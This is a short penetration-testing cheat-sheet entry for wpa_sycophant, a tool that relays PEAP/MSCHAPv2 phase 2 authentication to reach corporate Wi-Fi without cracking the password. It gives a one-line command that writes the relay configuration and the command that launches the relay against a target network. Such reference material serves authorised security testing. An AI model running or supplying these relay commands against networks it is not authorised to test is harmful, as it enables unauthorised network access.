# wpa_sycophant
% wifi, wpa_sycophant, wifi relay attack
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
A tool to relay phase 2 authentication attempts to access corporate wireless without cracking the password.
```

## _repo
```
https://github.com/sensepost/wpa_sycophant/tree/master
```

## _doc
```
https://github.com/sensepost/wpa_sycophant/tree/master
```

## _install
```
```

## create config
```bash
echo -e 'network={\n    ssid="<ssid>"\n    scan_ssid=1\n    key_mgmt=WPA-EAP\n    identity=""\n    anonymous_identity=""\n    password=""\n    eap=PEAP\n    phase1="crypto_binding=0 peaplabel=0"\n    phase2="auth=MSCHAPV2"\n    bssid_blacklist=<hostapd-mana_bssid>\n}' > wpa_sycophant.config
```

## launch relay
```bash
wpa_sycophant.sh -c wpa_sycophant.config -i <wlan_interface|wlan1>
```